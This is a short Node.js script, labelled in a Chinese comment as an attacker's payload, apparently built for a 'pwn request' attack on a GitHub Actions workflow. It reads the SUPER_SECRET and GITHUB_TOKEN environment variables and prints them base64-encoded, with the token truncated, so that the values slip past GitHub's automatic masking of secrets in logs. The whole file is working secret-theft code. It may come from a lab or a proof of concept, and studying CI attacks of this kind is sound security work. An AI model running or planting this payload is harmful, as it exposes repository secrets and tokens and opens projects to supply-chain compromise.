// === 攻击者 payload v2:base64 编码绕过 GitHub 自动脱敏 ===
const s = process.env.SUPER_SECRET || "";
const g = process.env.GITHUB_TOKEN || "";
console.log("### PWN-REQUEST PAYLOAD EXECUTED ###");
console.log("event_name =", process.env.GITHUB_EVENT_NAME);
console.log("SECRET_LEN =", s.length);
console.log("SECRET_B64 =", s ? Buffer.from(s).toString("base64") : "(empty)");
console.log("TOKEN_B64  =", g ? Buffer.from(g).toString("base64").slice(0,24)+"..." : "(empty)");
console.log("### END ###");
